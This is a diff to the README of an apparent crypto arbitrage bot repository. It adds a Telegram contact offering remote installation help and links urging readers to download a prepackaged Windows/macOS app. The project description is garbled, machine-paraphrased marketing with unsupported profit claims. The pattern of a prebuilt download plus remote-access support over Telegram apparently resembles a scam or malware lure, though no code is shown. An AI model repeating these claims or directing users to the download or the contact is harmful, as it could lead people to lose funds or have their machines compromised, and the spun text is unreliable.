@@ -5,7 +5,15 @@
 <img src=https://img.shields.io/github/issues-pr/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot?style=for-the-badge&logo=appveyor&color=informational />
 </p>
 
-## [Download (Windows / macOS)](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/latest).
+
+**Telegram Support**
+
+If you need any help, you can send a message on [Telegram Support](https://t.me/pancakeswapprediction) 24/7 to get free full support for the installation of the bot, either remotely or with step-by-step guidance.
+
+## [Download (Windows / macOS)](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/latest)
+
+You can easily access our application by downloading the packaged version suitable for your operating system from the link above. [Download (Windows App)](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/latest).
+
 
 # About -- Solana Network Added!
 The bot ceaselessly screens the costs of particular resources on distinctive DEXs, seeking out for openings to purchase at a lower price on one trade and offer at the next cost on another. When a favorable arbitrage opportunity is distinguished, the bot consequently executes the exchanges to capitalize on the cost dissimilarity and create profits.Through nonstop checking of different DEX stages, bot analyzes real-time showcase information to distinguish occasions where an asset's cost veers altogether over trades.
@@ -39,7 +47,6 @@ Thanks to artificial intelligence support, we are confident that we have the mos
 
 Download and Install Git here:
 [Git_Win](https://git-scm.com/download/win)   /  [ Git_Mac](https://git-scm.com/download/mac)
-
 
 
 Download and Install Python here:
